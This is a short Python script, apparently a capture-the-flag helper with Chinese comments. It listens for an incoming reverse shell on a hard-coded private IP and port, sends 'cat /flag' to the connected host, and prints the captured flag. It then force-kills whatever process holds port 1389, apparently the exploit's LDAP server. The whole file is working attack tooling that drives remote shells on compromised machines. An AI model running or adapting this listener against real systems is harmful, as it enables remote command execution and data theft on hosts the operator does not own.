# encoding: utf-8
import socket
import os
import subprocess
import re

def main(ip, port):    # ip为本机ip，但不能是127.0.0.1 port为反弹shell监听端口
    sever = socket.socket()
    sever.bind((ip, port))
    sever.listen(5)
    print("等待连接中...")
    conn , addr = sever.accept()
    print(f"已连接到{addr}")
    i = 1
    while i <= 2:
        data = conn.recv(2048)
        data = data.decode("u8")
        command = '\n cat /flag \n'  # 中间命令可改，其余一个字都动不得！！
        conn.send(command.encode())
        output = conn.recv(4096).decode()
        list = []
        list.append(data.split("\n"))
        i = i + 1
    conn.close()
    sever.close()
    print('\n'+f"[+]主机{addr}的flag为 "+list[0][2])

    SERVER_PORT = 1389
    get_process_prot_cmd = f'ss -anpl | grep -w {SERVER_PORT}'
    result = subprocess.run(
        get_process_prot_cmd,
        shell=True,
        stdout=subprocess.PIPE,
    )
    if result.returncode == 0:
        parse_res = result.stdout.decode()
        pids = re.findall(r'pid=(\d+)', parse_res)
        for pid in pids:
            os.system(f'kill -9 {pid}')

main("192.168.75.171", 8889) # ip为本机ip，但不能是127.0.0.1 port为反弹shell监听端口
#         本机ip      监听端口